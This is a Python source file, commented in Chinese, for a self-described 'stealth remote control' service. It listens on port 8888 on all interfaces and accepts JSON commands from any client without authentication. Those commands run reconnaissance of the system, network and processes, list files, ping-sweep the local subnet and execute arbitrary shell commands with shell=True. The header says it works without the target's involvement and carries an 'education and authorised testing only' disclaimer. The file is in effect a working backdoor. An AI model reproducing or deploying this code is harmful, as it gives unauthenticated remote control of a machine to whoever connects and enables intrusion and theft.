#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
无感远程控制工具 - 被动连接监听服务
无需对方操作，主动发起连接即可控制
仅用于教育和授权的安全测试
"""

import socket
import threading
import json
import subprocess
import platform
import os
import sys
import time
from datetime import datetime
import psutil
import logging

class StealthRemoteControl:
    """无感远程控制服务"""
    
    def __init__(self, port=8888):
        self.port = port
        self.server_socket = None
        self.is_running = False
        self.clients = {}
        
        # 设置日志
        self.setup_logging()
        
    def setup_logging(self):
        """设置日志系统"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('stealth_server.log', encoding='utf-8'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
        
    def start_server(self):
        """启动被动监听服务"""
        try:
            # 创建服务器套接字
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.port))
            self.server_socket.listen(5)
            self.server_socket.settimeout(1.0)  # 设置超时以允许检查停止标志
            
            self.is_running = True
            self.logger.info(f"🚀 无感远程控制服务已启动，监听端口: {self.port}")
            self.logger.info("💡 服务特点: 无需对方操作，主动连接即可控制")
            
            # 显示本机信息
            self.show_local_info()
            
            # 启动接受连接线程
            accept_thread = threading.Thread(target=self.accept_connections, daemon=True)
            accept_thread.start()
            
            return True
            
        except Exception as e:
            self.logger.error(f"❌ 启动服务器失败: {e}")
            return False
    
    def show_local_info(self):
        """显示本机信息"""
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            
            self.logger.info("=" * 50)
            self.logger.info("📋 本机信息:")
            self.logger.info(f"  主机名: {hostname}")
            self.logger.info(f"  IP地址: {local_ip}")
            self.logger.info(f"  监听端口: {self.port}")
            self.logger.info(f"  操作系统: {platform.system()} {platform.release()}")
            self.logger.info("=" * 50)
            self.logger.info("💡 连接方式:")
            self.logger.info(f"  控制方: python stealth_remote_client.py {local_ip}")
            self.logger.info("=" * 50)
            
        except Exception as e:
            self.logger.error(f"获取本机信息失败: {e}")
    
    def accept_connections(self):
        """接受客户端连接"""
        while self.is_running:
            try:
                client_socket, client_address = self.server_socket.accept()
                self.logger.info(f"🔗 新连接来自: {client_address}")
                
                # 创建客户端处理线程
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address),
                    daemon=True
                )
                client_thread.start()
                
                # 存储客户端信息
                client_id = f"{client_address[0]}:{client_address[1]}"
                self.clients[client_id] = {
                    'socket': client_socket,
                    'address': client_address,
                    'thread': client_thread,
                    'connected_at': datetime.now()
                }
                
            except socket.timeout:
                continue
            except Exception as e:
                if self.is_running:
                    self.logger.error(f"接受连接错误: {e}")
    
    def handle_client(self, client_socket, client_address):
        """处理客户端连接"""
        client_id = f"{client_address[0]}:{client_address[1]}"
        
        try:
            client_socket.settimeout(1.0)
            
            while self.is_running:
                try:
                    # 接收命令数据
                    data = client_socket.recv(4096).decode('utf-8')
                    if not data:
                        break
                    
                    # 解析命令
                    try:
                        command_data = json.loads(data)
                        command = command_data.get('command', '')
                        args = command_data.get('args', [])
                        
                        self.logger.info(f"📨 收到命令: {command} {args}")
                        
                        # 执行命令
                        result = self.execute_command(command, args)
                        
                        # 发送响应
                        response = {
                            'status': 'success',
                            'result': result,
                            'timestamp': datetime.now().isoformat()
                        }
                        
                        client_socket.send(json.dumps(response).encode('utf-8'))
                        
                    except json.JSONDecodeError:
                        self.logger.warning(f"无效的命令格式: {data}")
                        
                except socket.timeout:
                    continue
                except Exception as e:
                    self.logger.error(f"处理命令错误: {e}")
                    break
                    
        except Exception as e:
            self.logger.error(f"客户端处理错误: {e}")
        finally:
            # 清理客户端连接
            client_socket.close()
            if client_id in self.clients:
                del self.clients[client_id]
            self.logger.info(f"🔌 客户端断开连接: {client_address}")
    
    def execute_command(self, command, args):
        """执行远程命令"""
        try:
            if command == 'system_info':
                return self.get_system_info()
            elif command == 'network_info':
                return self.get_network_info()
            elif command == 'system_status':
                return self.get_system_status()
            elif command == 'file_list':
                path = args[0] if args else '.'
                return self.list_files(path)
            elif command == 'process_list':
                return self.get_process_list()
            elif command == 'ping':
                target = args[0] if args else '8.8.8.8'
                return self.ping_target(target)
            elif command == 'scan_network':
                return self.scan_network()
            elif command == 'execute':
                cmd = ' '.join(args)
                return self.execute_system_command(cmd)
            else:
                return {'error': f'未知命令: {command}'}
                
        except Exception as e:
            return {'error': f'执行命令失败: {str(e)}'}
    
    def get_system_info(self):
        """获取系统信息"""
        return {
            'platform': platform.platform(),
            'hostname': socket.gethostname(),
            'ip_address': socket.gethostbyname(socket.gethostname()),
            'processor': platform.processor(),
            'architecture': platform.architecture()[0],
            'python_version': platform.python_version(),
            'current_user': os.getlogin(),
            'working_directory': os.getcwd()
        }
    
    def get_network_info(self):
        """获取网络信息"""
        interfaces = {}
        for interface, addrs in psutil.net_if_addrs().items():
            interfaces[interface] = []
            for addr in addrs:
                interfaces[interface].append({
                    'family': addr.family.name,
                    'address': addr.address,
                    'netmask': addr.netmask
                })
        
        return {
            'interfaces': interfaces,
            'connections': len(psutil.net_connections())
        }
    
    def get_system_status(self):
        """获取系统状态"""
        return {
            'cpu_percent': psutil.cpu_percent(interval=1),
            'memory_percent': psutil.virtual_memory().percent,
            'disk_usage': psutil.disk_usage('/').percent if os.name != 'nt' else psutil.disk_usage('C:\\').percent,
            'boot_time': datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S'),
            'running_processes': len(psutil.pids())
        }
    
    def list_files(self, path):
        """列出目录文件"""
        try:
            files = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                stat = os.stat(item_path)
                files.append({
                    'name': item,
                    'size': stat.st_size,
                    'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
                    'is_dir': os.path.isdir(item_path)
                })
            return {'path': path, 'files': files}
        except Exception as e:
            return {'error': f'无法访问目录: {str(e)}'}
    
    def get_process_list(self):
        """获取进程列表"""
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'memory_percent', 'cpu_percent']):
            try:
                processes.append({
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'memory': round(proc.info['memory_percent'], 2),
                    'cpu': round(proc.info['cpu_percent'], 2)
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        return {'processes': sorted(processes, key=lambda x: x['memory'], reverse=True)[:20]}
    
    def ping_target(self, target):
        """ping目标地址"""
        try:
            param = '-n' if platform.system().lower() == 'windows' else '-c'
            result = subprocess.run(['ping', param, '4', target], 
                                  capture_output=True, text=True, timeout=10)
            return {'output': result.stdout, 'return_code': result.returncode}
        except Exception as e:
            return {'error': f'ping失败: {str(e)}'}
    
    def scan_network(self):
        """扫描网络设备"""
        devices = []
        local_ip = socket.gethostbyname(socket.gethostname())
        network_prefix = '.'.join(local_ip.split('.')[:3])
        
        def ping_device(ip):
            try:
                param = '-n' if platform.system().lower() == 'windows' else '-c'
                result = subprocess.run(['ping', param, '1', '-w', '1000', ip], 
                                      capture_output=True, text=True, timeout=2)
                return result.returncode == 0
            except:
                return False
        
        # 扫描局域网设备
        for i in range(1, 255):
            ip = f"{network_prefix}.{i}"
            if ping_device(ip):
                devices.append(ip)
        
        return {'network': network_prefix, 'devices': devices}
    
    def execute_system_command(self, cmd):
        """执行系统命令"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return {
                'return_code': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr
            }
        except Exception as e:
            return {'error': f'执行命令失败: {str(e)}'}
    
    def stop_server(self):
        """停止服务器"""
        self.is_running = False
        
        # 关闭所有客户端连接
        for client_id, client_info in list(self.clients.items()):
            try:
                client_info['socket'].close()
            except:
                pass
        
        # 关闭服务器套接字
        if self.server_socket:
            self.server_socket.close()
        
        self.logger.info("🛑 无感远程控制服务已停止")

def main():
    """主函数"""
    print("=" * 60)
    print("           无感远程控制服务 - 被动监听模式")
    print("=" * 60)
    print("💡 特点: 无需对方操作，主动连接即可控制")
    print("⚠️  警告: 仅用于教育和授权的安全测试")
    print("=" * 60)
    
    # 创建服务实例
    server = StealthRemoteControl(port=8888)
    
    try:
        # 启动服务
        if server.start_server():
            print("\n🎯 服务正在运行...")
            print("💡 按 Ctrl+C 停止服务")
            
            # 保持主线程运行
            while server.is_running:
                time.sleep(1)
                
        else:
            print("❌ 服务启动失败")
            
    except KeyboardInterrupt:
        print("\n🛑 收到停止信号...")
    finally:
        server.stop_server()

if __name__ == "__main__":
    main()